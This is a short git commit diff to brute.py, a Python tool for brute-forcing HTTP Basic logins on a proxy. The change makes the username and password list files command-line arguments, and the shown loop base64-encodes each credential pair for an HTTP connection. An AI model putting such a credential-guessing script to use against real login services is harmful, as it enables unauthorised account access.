cb4142e23b4be3e284f22f1b7e76b16c2c7d3632
Aniket Panse <aniketpanse@gmail.com>
2013-03-19 22:03:38 +0530

    give files on cmd line

--- brute.py
+++ brute.py
@@ -11,17 +11,17 @@ import httplib
 
 def main():
     parser = argparse.ArgumentParser(description='Bruteforce HTTP Logins')
-    #~ parser.add_argument("-u", "--usrslst", help="File containing the usernames")
-    #~ parser.add_argument("-p", "--passlst", help="File containing the passwords")
+    parser.add_argument("-u", "--usrslst", help="File containing the usernames")
+    parser.add_argument("-p", "--passlst", help="File containing the passwords")
     parser.add_argument("host", help="IP Address/Hostname of Proxy")
     parser.add_argument("port", help="Port on which the Proxy is listening")
     args = parser.parse_args()
     logger = logging.getLogger("default")
-    
-    for user in open('users'):
+
+    for user in open(args.usrslst):
         #remove newline character
         user = user[:-1]
-        for psw in open('psw'):
+        for psw in open(args.passlst):
             psw = psw[:-1]
             enc_str = base64.b64encode(user + ':' + psw)
             client = httplib.HTTPConnection(args.host, int(args.port))
